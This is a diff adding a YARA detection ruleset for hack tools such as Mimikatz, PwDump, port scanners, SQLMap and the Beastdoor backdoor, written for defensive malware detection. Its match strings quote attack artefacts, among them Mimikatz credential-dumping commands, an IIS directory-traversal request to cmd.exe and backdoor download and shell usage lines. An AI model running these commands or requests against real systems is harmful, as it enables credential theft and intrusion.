@@ -1,0 +1,3241 @@
+/*
+    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
+
+*/
+
+import "pe"
+
+
+rule PwDump
+{
+	meta:
+		description = "PwDump 6 variant"
+		author = "Marc Stroebel"
+		date = "2014-04-24"
+		score = 70
+	strings:
+		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
+		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
+		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
+	condition:
+		all of them
+}
+
+rule PScan_Portscan_1 {
+	meta:
+		description = "PScan - Port Scanner"
+		author = "F. Roth"
+		score = 50
+	strings:
+		$a = "00050;0F0M0X0a0v0}0"
+		$b = "vwgvwgvP76"
+		$c = "Pr0PhOFyP"
+		condition:
+		all of them
+}
+
+rule HackTool_Samples {
+	meta: 
+		description = "Hacktool"
+		score = 50
+	strings:
+		$a = "Unable to uninstall the fgexec service"
+		$b = "Unable to set socket to sniff"
+		$c = "Failed to load SAM functions"
+		$d = "Dump system passwords"
+		$e = "Error opening sam hive or not valid file"
+		$f = "Couldn't find LSASS pid"
+		$g = "samdump.dll"
+		$h = "WPEPRO SEND PACKET"
+		$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
+		$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
+		$k = "arpspoof\\Debug"
+		$l = "Success: The log has been cleared"
+		$m = "clearlogs [\\\\computername"
+		$n = "DumpUsers 1."
+		$o = "dictionary attack with specified dictionary file"
+		$p = "by Objectif Securite"
+		$q = "objectif-securite"
+		$r = "Cannot query LSA Secret on remote host"
+		$s = "Cannot write to process memory on remote host"
+		$t = "Cannot start PWDumpX service on host"
+		$u = "usage: %s <system hive> <security hive>"
+		$v = "username:domainname:LMhash:NThash"
+		$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
+		$x = "Impersonation Tokens Available"
+		$y = "failed to parse pwdump format string"
+		$z = "Dumping password"
+	condition: 
+		1 of them
+}
+
+rule HackTool_Producers {
+	meta: description = "Hacktool Producers String" threat_level = 5 score = 50
+	strings:
+	$a1 = "www.oxid.it"
+	$a2 = "www.analogx.com"
+	$a3 = "ntsecurity.nu"
+	$a4 = "gentilkiwi.com"
+	$a6 = "Marcus Murray"
+	$extension = /extension: \.(ini|xml)\n/
+	condition: 1 of ($a*) and not $extension
+}
+
+/* Mimikatz */
+
+rule Mimikatz_Memory_Rule_1 : APT {
+	meta: 
+		author = "Florian Roth"
+		date = "12/22/2014"
+		score = 70
+		type = "memory"
+		description = "Detects password dumper mimikatz in memory"
+	strings:
+		$s1 = "sekurlsa::msv" fullword ascii
+	    $s2 = "sekurlsa::wdigest" fullword ascii
+	    $s4 = "sekurlsa::kerberos" fullword ascii
+	    $s5 = "sekurlsa::tspkg" fullword ascii
+	    $s6 = "sekurlsa::livessp" fullword ascii
+	    $s7 = "sekurlsa::ssp" fullword ascii
+	    $s8 = "sekurlsa::logonPasswords" fullword ascii
+	    $s9 = "sekurlsa::process" fullword ascii
+	    $s10 = "ekurlsa::minidump" fullword ascii
+	    $s11 = "sekurlsa::pth" fullword ascii
+	    $s12 = "sekurlsa::tickets" fullword ascii
+	    $s13 = "sekurlsa::ekeys" fullword ascii
+	    $s14 = "sekurlsa::dpapi" fullword ascii
+	    $s15 = "sekurlsa::credman" fullword ascii
+	condition:
+		1 of them
+}
+
+rule Mimikatz_Memory_Rule_2 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a memory dump"
+		author = "Florian Roth - Florian Roth"
+		type = "memory"
+		score = 80
+	strings:
+		$s0 = "sekurlsa::" ascii
+		$x1 = "cryptprimitives.pdb" ascii
+		$x2 = "Now is t1O" ascii fullword
+		$x4 = "ALICE123" ascii
+		$x5 = "BOBBY456" ascii
+	condition:
+		$s0 and 1 of ($x*)
+}
+
+rule Mimikatz_SampleSet_1 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash1 = "9ef9762169e8b44d01613234927f44d6"
+		hash2 = "35b34bb9f1ad0fdf48dc090ed4a8190f"	
+		hash3 = "516fde1fe06f96a019c3ad063c78b760"
+		hash4 = "faf248ee5184b65d28786d91c02864a6"
+		hash5 = "5847659129c4e711809ab5b6ab1b8bd8"
+		score = 80
+	strings:
+		$s0 = "mimikatz_trunk/Win32/mimidrv.sys" fullword
+		$s1 = "Mimikatz 2.0\\x64\\mimidrv.sys" fullword
+		$s2 = "32\\kelloworld.dll"
+		$s3 = "64\\kelloworld.dll"
+		$s4 = "32/kelloworld.dll"
+		$s5 = "64/kelloworld.dll"
+		$s6 = "mimidrv.sys" fullword
+		$s7 = "sekurlsa.lib" fullword
+		$s8 = "mimilib.dll" fullword
+		$s9 = "mimikatz.exe" fullword
+	condition:
+		3 of them
+}
+rule Mimikatz_SampleSet_2 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash = "6f14b6744aad66ac017ab7733cdb51ad"
+		score = 50
+	strings:
+		$s0 = "notsupported" fullword
+		$s1 = "getKerberos" fullword
+		$s2 = "M(knN0123456789abcdefghijklmnopqrstuvwxyz" fullword
+		$s3 = "getLiveSSPFunctions" fullword
+		$s4 = "getKerberosFunctions" fullword
+		$s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><tr"
+		$s6 = ".?AV_System_error@std@@" fullword
+		$s7 = "getCredmanFunctions" fullword
+		$s8 = "find_tokens" fullword
+	condition:
+		all of them
+}
+
+rule Mimikatz_SampleSet_3 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash = "f62848e3cd2f0316608c2696c6504b4a"
+		score = 50
+	strings:
+		$s8 = "x64/intra.kirbi" fullword
+		$s9 = "x64/intra.kirbi*kb" fullword
+	condition:
+		all of them
+}
+
+rule Mimikatz_SampleSet_4 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash1 = "8991aeef8b33049c5997c59afcea4a27"
+		hash2 = "a3e00b039f2d2ea04a4274506dd83be0"
+		hash3 = "cb5d40cc8db79c3d24f20f443f7e5926"
+		score = 40
+	strings:
+		$s0 = "notsupported" fullword
+		$s1 = "getLiveSSP" fullword
+		$s2 = "getKerberos" fullword
+		$s3 = "getLiveSSPFunctions" fullword
+		$s4 = "getKerberosFunctions" fullword
+		$s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><tr"
+		$s6 = "getCredmanFunctions" fullword
+		$s7 = "getCredman" fullword
+		$s8 = "find_tokens" fullword
+	condition:
+		all of them
+}
+
+rule Mimikatz_SampleSet_5 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash1 = "9ca015f05cc4cbae8d50bcd067e6d605"
+		score = 50
+	strings:
+		$s6 = "mimidrv.sys" fullword
+	condition:
+		all of them
+}
+rule Mimikatz_SampleSet_6 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		hash = "739c80bac405eb1b0ebbe10a75515ff1"
+	strings:
+		$s1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><tr"
+		$s2 = "Erreur : impossible d'ouvrir le bureau cible (" fullword
+	condition:
+		all of them
+}
+
+rule Mimikatz_SampleSet_7 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		super_rule = 1
+		hash0 = "821e5dc1ad4bbad2958e036c84bf7734"
+		hash1 = "e39e57fb7ff38e7be1a8da785ef83557"
+		hash2 = "9ecb8020b0989778009d5aaf13640ea4"
+		hash3 = "4bfe2b27a63678fa6b4bd27c8d309508"
+		hash4 = "fb164aadc2ae4a7aa3fc3f54cd8fa92a"
+		hash5 = "33786d2823e6d5e75b1a3a8bb2837b40"
+		hash6 = "a4c1feb5f3f5a71320aeca588cb1f14c"
+		hash7 = "36fc962a871cfb9f7d31dc9faaab5b54"
+		hash8 = "35bc4af0cbaa48e8a72884e3e690fc3b"
+		hash9 = "f1de7a81394efe6cc9438033a75cae0d"
+		hash10 = "a6e0cf20f2de5149885297188644f123"
+		hash11 = "bb7d4174e9ffae01a14993c528de8653"
+		hash12 = "ffd3df1ee7bfd6f1255221c3f82478f1"
+		hash13 = "eaf8dfbe80c42dd92740a9e71ea444ab"
+		hash14 = "e25b75621c03da7addc55dac378d77c4"
+		hash15 = "41ea9b05bcfceca78d51f776bfdee393"
+		hash16 = "a03a4272be8a2ee5e48ba2c417ff3b5b"
+		hash17 = "96501f7e9dc19a4012b1f5db1dce7018"
+		hash18 = "b6fe1b2e961c294155d8f48b6c57f28f"
+		hash19 = "1680c6afebcb77a21b6619aedc304931"
+		hash20 = "46820c90b2fb296e26b4bb8f7cad51ac"
+		hash21 = "a21634571795601f5eace5d503246b3b"
+		hash22 = "e6dda29f842ce3b7c72b5536fab4f860"
+		hash23 = "006480db3303a7ba9d73e32bc6c0bc11"
+		hash24 = "efa68dd73410c4be6f6b0a95a02762f2"
+		hash25 = "7194944aa418851631d7e614ff430b0a"
+		hash26 = "3a98b9190bf6ed5f75d9c3950a63dd08"
+		hash27 = "02f7536279480b73c9942c072c1b5316"
+		hash28 = "8638370c805dc92581eba34fa57eb45e"
+		hash29 = "6f393ab258b87790a45d6d2b125bbc24"
+		hash30 = "dbb01a015ab11266bae5d6381ffd41c2"
+		score = 80
+	strings:
+		$s0 = "#         * Kernel mode *         #" fullword
+		$s1 = "kerberos!KerbGlobalLogonSessionTable" fullword
+		$s2 = "Authentication Id : %u ; %u (%08x:%08x)" fullword
+		$s3 = "%p - lsasrv!InitializationVector" fullword
+		$s4 = "%p - lsasrv!LogonSessionListCount" fullword
+		$s7 = "#          * User mode *          #" fullword
+		$s8 = "##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )"
+		$s9 = "livessp!LiveGlobalLogonSessionList" fullword
+	condition:
+		all of them
+}
+rule Mimikatz_SampleSet_8 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		super_rule = 1
+		hash0 = "0a10fe0a341ac0b24347f183c83123cc"
+		hash1 = "d7e16bc11cdfc0f781e87f5df4ae24a5"
+		hash2 = "abdb41e32c447e703b03c9e307565ed3"
+		score = 40
+	strings:
+		$s0 = "?!?(?0?8?@?H?P?X?`?n?w?" fullword
+		$s1 = "2\"2'2.24292@2F2K2R2X2]2d2j2o2v2|2" fullword
+		$s2 = "7!7<7C7P7V7^7d7r7" fullword
+		$s3 = "0#0)0=0E0K0[0c0i0" fullword
+		$s4 = "878E8L8Y8`8f8l8r8" fullword
+		$s5 = ":*:/:7:=:B:I:O:T:[:a:f:m:s:x:" fullword
+		$s6 = "<'<4<9<D<K<Q<X<e<j<u<{<" fullword
+		$s7 = "8&878?8M8R8]8d8q8~8" fullword
+		$s8 = ";,;2;A;F;L;_;d;k;q;" fullword
+		$s9 = "3%3+31373=3C3I3N3_3s3" fullword
+	condition:
+		all of them
+}
+rule Mimikatz_SampleSet_9 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		super_rule = 1
+		hash0 = "6e2eda476c141c63ff62c92d8b52ff7e"
+		hash1 = "f42b75103230cab39e4c58d5b0dca2c4"
+		hash2 = "dc6f62e3a0b584cb134633a12fd7d7b8"
+		hash3 = "d5918d735a23f746f0e83f724c4f26e5"
+		hash4 = "e98b714ccd14e61f776cc55a602d2dd0"
+		hash5 = "09a6e5cc589a485d9ab4eda772b46f2a"
+		hash6 = "4a51faef37af8b70fc9cf7c64f030b25"
+		hash7 = "e52e30811287426d4eef089a65cc2acf"
+		hash8 = "cd1606a1800150a33dea71d3f3ee9aed"
+		hash9 = "510fe825464dca92aadcd3d8289405aa"
+		hash10 = "0be87e16eb598006358cdaa9dfcd5af5"
+		hash11 = "1f0ce022ee9fe8d92235809eda73ce38"
+		hash12 = "e172a38ade3aa0a2bc1bf9604a54a3b5"
+		hash13 = "de20bddb9c3b1b09d980db5bbb5b5789"
+		hash14 = "c77db1ddffc7e6edac60bb5ca9a6e863"
+		hash15 = "6d8008edd86c5ca1a112018852777b1e"
+		hash16 = "525d6ca1446b01f912303f04f0c713ab"
+		score = 70
+	strings:
+		$s6 = "\\i386\\mimidrv.pdb"
+	condition:
+		all of them
+}
+rule Mimikatz_SampleSet_10 : APT {
+	meta:
+		description = "Mimikatz Rule generated from a big Mimikatz sample set"
+		author = "Florian Roth - Florian Roth"
+		super_rule = 1
+		hash0 = "5522fd8fe2e205b30f9e74a94da0352d"
+		hash1 = "ec428ed7d1cc4ba3023696ddc138a376"
+		hash2 = "13e88493f844a0df3352cd721bfa41a6"
+		hash3 = "483e5365e1f1d83c2dcd4bdb398e779f"
+		hash4 = "04d04a1f0ff9e2ff1d35b8c2950cce53"
+		hash5 = "97cbbd6c4153ae4a410439e2c02d77ce"
+		hash6 = "b43dfc8be8db7eacfc993e323229fb9f"
+		hash7 = "72e95180a2e4ab59e1b7c10f1054740a"
+		hash8 = "eaaecd5bd100923c72d2b39d84dfd411"
+		hash9 = "a8ae792f0384fd3e7f411c826b48b7c8"
+		score = 40
+	strings:
+		$s0 = "D$hL9(t" fullword
+		$s1 = "l$LfD9o" fullword
+		$s2 = "AHH90t?L" fullword
+		$s3 = "M9Qpv\"I9Ips" fullword
+		$s4 = "tSD8T$<u" fullword
+		$s5 = ";f9T$Xw" fullword
+		$s6 = "6f9L$Xw" fullword
+		$s7 = "f;\\$@u1E3" fullword
+		$s8 = "8\\$8uFH" fullword
+		$s9 = "L$DfD;O" fullword
+	condition:
+		all of them
+}
+
+/* Removed Mimikatz samples set super rules 11 - 27 */
+
+/* Disclosed hack tool set */
+
+rule Fierce2
+{
+	meta:
+		author = "Florian Roth"
+		description = "This signature detects the Fierce2 domain scanner"
+		date = "07/2014"
+		score = 60
+	strings:
+		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
+	condition:
+		1 of them
+}
+
+rule Ncrack
+{
+	meta:
+		author = "Florian Roth"
+		description = "This signature detects the Ncrack brute force tool"
+		date = "07/2014"
+		score = 60
+	strings:
+		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
+	condition:
+		1 of them
+}
+
+rule SQLMap
+{
+	meta:
+		author = "Florian Roth"
+		description = "This signature detects the SQLMap SQL injection tool"
+		date = "07/2014"
+		score = 60
+	strings:
+		$s1 = "except SqlmapBaseException, ex:"
+	condition:
+		1 of them
+}
+
+rule PortScanner {
+	meta:
+		description = "Auto-generated rule on file PortScanner.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "b381b9212282c0c650cb4b0323436c63"
+	strings:
+		$s0 = "Scan Ports Every"
+		$s3 = "Scan All Possible Ports!"
+	condition:
+		all of them
+}
+
+rule DomainScanV1_0 {
+	meta:
+		description = "Auto-generated rule on file DomainScanV1_0.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
+	strings:
+		$s0 = "dIJMuX$aO-EV"
+		$s1 = "XELUxP\"-\\"
+		$s2 = "KaR\"U'}-M,."
+		$s3 = "V.)\\ZDxpLSav"
+		$s4 = "Decompress error"
+		$s5 = "Can't load library"
+		$s6 = "Can't load function"
+		$s7 = "com0tl32:.d"
+	condition:
+		all of them
+}
+
+rule MooreR_Port_Scanner {
+	meta:
+		description = "Auto-generated rule on file MooreR Port Scanner.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "376304acdd0b0251c8b19fea20bb6f5b"
+	strings:
+		$s0 = "Description|"
+		$s3 = "soft Visual Studio\\VB9yp"
+		$s4 = "adj_fptan?4"
+		$s7 = "DOWS\\SyMem32\\/o"
+	condition:
+		all of them
+}
+
+rule NetBIOS_Name_Scanner {
+	meta:
+		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
+	strings:
+		$s0 = "IconEx"
+		$s2 = "soft Visual Stu"
+		$s4 = "NBTScanner!y&"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___Scanners_ipscan {
+	meta:
+		description = "Auto-generated rule on file ipscan.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
+	strings:
+		$s2 = "WCAP;}ECTED"
+		$s4 = "NotSupported"
+		$s6 = "SCAN.VERSION{_"
+	condition:
+		all of them
+}
+
+rule CGISscan_CGIScan {
+	meta:
+		description = "Auto-generated rule on file CGIScan.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "338820e4e8e7c943074d5a5bc832458a"
+	strings:
+		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
+		$s3 = "tcp is the only protocol supported thru socks server"
+		
+		$path1 = /filepath: .{,70}EPO.{,70}\n/
+	condition:
+		$s2 and $s3 and not $path1
+}
+
+rule IP_Stealing_Utilities {
+	meta:
+		description = "Auto-generated rule on file IP Stealing Utilities.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
+	strings:
+		$s0 = "DarkKnight"
+		$s9 = "IPStealerUtilities"
+	condition:
+		all of them
+}
+
+rule SuperScan4 {
+	meta:
+		description = "Auto-generated rule on file SuperScan4.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "78f76428ede30e555044b83c47bc86f0"
+	strings:
+		$s2 = " td class=\"summO1\">"
+		$s6 = "REM'EBAqRISE"
+		$s7 = "CorExitProcess'msc#e"
+	condition:
+		all of them
+
+}
+rule PortRacer {
+	meta:
+		description = "Auto-generated rule on file PortRacer.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "2834a872a0a8da5b1be5db65dfdef388"
+	strings:
+		$s0 = "Auto Scroll BOTH Text Boxes"
+		$s4 = "Start/Stop Portscanning"
+		$s6 = "Auto Save LogFile by pressing STOP"
+	condition:
+		all of them
+}
+
+rule scanarator {
+	meta:
+		description = "Auto-generated rule on file scanarator.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "848bd5a518e0b6c05bd29aceb8536c46"
+	strings:
+		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
+	condition:
+		all of them
+}
+
+rule aolipsniffer {
+	meta:
+		description = "Auto-generated rule on file aolipsniffer.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "51565754ea43d2d57b712d9f0a3e62b8"
+	strings:
+		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
+		$s1 = "dwGetAddressForObject"
+		$s2 = "Color Transfer Settings"
+		$s3 = "FX Global Lighting Angle"
+		$s4 = "Version compatibility info"
+		$s5 = "New Windows Thumbnail"
+		$s6 = "Layer ID Generator Base"
+		$s7 = "Color Halftone Settings"
+		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
+	condition:
+		all of them
+}
+
+rule _Bitchin_Threads_ {
+	meta:
+		description = "Auto-generated rule on file =Bitchin Threads=.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
+	strings:
+		$s0 = "DarKPaiN"
+		$s1 = "=BITCHIN THREADS"
+	condition:
+		all of them
+}
+
+rule cgis4_cgis4 {
+	meta:
+		description = "Auto-generated rule on file cgis4.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "d658dad1cd759d7f7d67da010e47ca23"
+	strings:
+		$s0 = ")PuMB_syJ"
+		$s1 = "&,fARW>yR"
+		$s2 = "m3hm3t_rullaz"
+		$s3 = "7Projectc1"
+		$s4 = "Ten-GGl\""
+		$s5 = "/Moziqlxa"
+	condition:
+		all of them
+}
+
+rule portscan {
+	meta:
+		description = "Auto-generated rule on file portscan.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "a8bfdb2a925e89a281956b1e3bb32348"
+	strings:
+		$s5 = "0    :SCAN BEGUN ON PORT:"
+		$s6 = "0    :PORTSCAN READY."
+	condition:
+		all of them
+}
+
+rule ProPort_zip_Folder_ProPort {
+	meta:
+		description = "Auto-generated rule on file ProPort.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
+	strings:
+		$s0 = "Corrupt Data!"
+		$s1 = "K4p~omkIz"
+		$s2 = "DllTrojanScan"
+		$s3 = "GetDllInfo"
+		$s4 = "Compressed by Petite (c)1999 Ian Luck."
+		$s5 = "GetFileCRC32"
+		$s6 = "GetTrojanNumber"
+		$s7 = "TFAKAbout"
+	condition:
+		all of them
+}
+
+rule StealthWasp_s_Basic_PortScanner_v1_2 {
+	meta:
+		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
+	strings:
+		$s1 = "Basic PortScanner"
+		$s6 = "Now scanning port:"
+	condition:
+		all of them
+}
+
+rule BluesPortScan {
+	meta:
+		description = "Auto-generated rule on file BluesPortScan.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "6292f5fc737511f91af5e35643fc9eef"
+	strings:
+		$s0 = "This program was made by Volker Voss"
+		$s1 = "JiBOo~SSB"
+	condition:
+		all of them
+}
+
+rule scanarator_iis {
+	meta:
+		description = "Auto-generated rule on file iis.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
+	strings:
+		$s0 = "example: iis 10.10.10.10"
+		$s1 = "send error"
+	condition:
+		all of them
+}
+
+rule stealth_Stealth {
+	meta:
+		description = "Auto-generated rule on file Stealth.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
+	strings:
+		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
+		$s6 = "This tool may be used only by system administrators. I am not responsible for "
+	condition:
+		all of them
+}
+
+rule Angry_IP_Scanner_v2_08_ipscan {
+	meta:
+		description = "Auto-generated rule on file ipscan.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "70cf2c09776a29c3e837cb79d291514a"
+	strings:
+		$s0 = "_H/EnumDisplay/"
+		$s5 = "ECTED.MSVCRT0x"
+		$s8 = "NotSupported7"
+	condition:
+		all of them
+}
+
+rule crack_Loader {
+	meta:
+		description = "Auto-generated rule on file Loader.exe"
+		author = "yarGen Yara Rule Generator by Florian Roth"
+		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
+	strings:
+		$s0 = "NeoWait.exe"
+		$s1 = "RRRRRRRW"
+	condition:
+		all of them
+}
+
+rule CN_GUI_Scanner {
+	meta: 
+		description = "Detects an unknown GUI scanner tool - CN background"
+		author = "Florian Roth"
+		hash = "3c67bbb1911cdaef5e675c56145e1112"
+		score = 65
+		date = "04.10.2014"
+	strings:
+		$s1 = "good.txt" fullword ascii
+		$s2 = "IP.txt" fullword ascii
+		$s3 = "xiaoyuer" fullword ascii
+		$s0w = "ssh(" fullword wide
+		$s1w = ").exe" fullword wide
+	condition:
+		all of them
+}	
+
+rule CN_Packed_Scanner {
+	meta: 
+		description = "Suspiciously packed executable"
+		author = "Florian Roth"
+		hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
+		score = 40
+		date = "06.10.2014"
+	strings:
+		$s1 = "kernel32.dll" fullword ascii
+		$s2 = "CRTDLL.DLL" fullword ascii
+		$s3 = "__GetMainArgs" fullword ascii
+		$s4 = "WS2_32.DLL" fullword ascii
+	condition:
+		all of them and filesize < 180KB and filesize > 70KB
+}
+
+rule Tiny_Network_Tool_Generic {
+	meta:
+		description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
+		author = "Florian Roth"
+		date = "08.10.2014"
+		score = 40
+		type = "file"
+		hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
+		hash1 = "cafc31d39c1e4721af3ba519759884b9"
+		hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
+	strings:
+		$magic	= { 4d 5a }
+	
+		$s0 = "KERNEL32.DLL" fullword ascii
+		$s1 = "CRTDLL.DLL" fullword ascii
+		$s3 = "LoadLibraryA" fullword ascii
+		$s4 = "GetProcAddress" fullword ascii
+
+		$y1 = "WININET.DLL" fullword ascii
+		$y2 = "atoi" fullword ascii
+		
+		$x1 = "ADVAPI32.DLL" fullword ascii
+		$x2 = "USER32.DLL" fullword ascii
+		$x3 = "wsock32.dll" fullword ascii
+		$x4 = "FreeSid" fullword ascii
+		$x5 = "atoi" fullword ascii
+
+		$z1 = "ADVAPI32.DLL" fullword ascii
+		$z2 = "USER32.DLL" fullword ascii
+		$z3 = "FreeSid" fullword ascii
+		$z4 = "ToAscii" fullword ascii
+		
+	condition:
+		( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
+}
+
+rule Beastdoor_Backdoor {
+	meta:
+		description = "Detects the backdoor Beastdoor"
+		author = "Florian Roth"
+		score = 55
+		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
+	strings:
+		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
+		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
+		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
+		$s7 = "Host: wwp.mirabilis.com:80" fullword
+		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
+		$s11 = "Shell                            -->Get A Shell" fullword
+		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
+		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
+		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
+	condition:
+		2 of them
+}
+
+rule Powershell_Netcat {
+	meta:
+		description = "Detects a Powershell version of the Netcat network hacking tool"
+		author = "Florian Roth"
+		score = 60
+		date = "10.10.2014"
+	strings:
+		$s0 = "[ValidateRange(1, 65535)]" fullword
+		$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
+		$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
+	condition:
+		all of them
+}
+
+rule Chinese_Hacktool_1014 {
+	meta:
+		description = "Detects a chinese hacktool with unknown use"
+		author = "Florian Roth"
+		score = 60
+		date = "10.10.2014"
+		hash = "98c07a62f7f0842bcdbf941170f34990"
+	strings:
+		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
+		$s1 = "msctls_progress32" fullword wide
+		$s2 = "Reply-To: %s" fullword ascii
+		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
+		$s4 = "html htm htx asp" fullword ascii
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_BAT_PortsOpen {
+	meta:
+		description = "Detects a chinese BAT hacktool for local port evaluation"
+		author = "Florian Roth"
+		score = 60
+		date = "12.10.2014"
+	strings:
+		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
+		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
+		$s2 = "@echo off" ascii
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_SSPort_Portscanner {
+	meta:
+		description = "Detects a chinese Portscanner named SSPort"
+		author = "Florian Roth"
+		score = 70
+		date = "12.10.2014"
+	strings:
+		$s0 = "Golden Fox" fullword wide
+		$s1 = "Syn Scan Port" fullword wide
+		$s2 = "CZ88.NET" fullword wide
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_ScanPort_Portscanner {
+	meta:
+		description = "Detects a chinese Portscanner named ScanPort"
+		author = "Florian Roth"
+		score = 70
+		date = "12.10.2014"
+	strings:
+		$s0 = "LScanPort" fullword wide
+		$s1 = "LScanPort Microsoft" fullword wide
+		$s2 = "www.yupsoft.com" fullword wide
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_S_EXE_Portscanner {
+	meta:
+		description = "Detects a chinese Portscanner named s.exe"
+		author = "Florian Roth"
+		score = 70
+		date = "12.10.2014"
+	strings:
+		$s0 = "\\Result.txt" fullword ascii
+		$s1 = "By:ZT QQ:376789051" fullword ascii
+		$s2 = "(http://www.eyuyan.com)" fullword wide
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_MilkT_BAT {
+	meta:
+		description = "Detects a chinese Portscanner named MilkT - shipped BAT"
+		author = "Florian Roth"
+		score = 70
+		date = "12.10.2014"
+	strings:
+		$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
+		$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_MilkT_Scanner {
+	meta:
+		description = "Detects a chinese Portscanner named MilkT"
+		author = "Florian Roth"
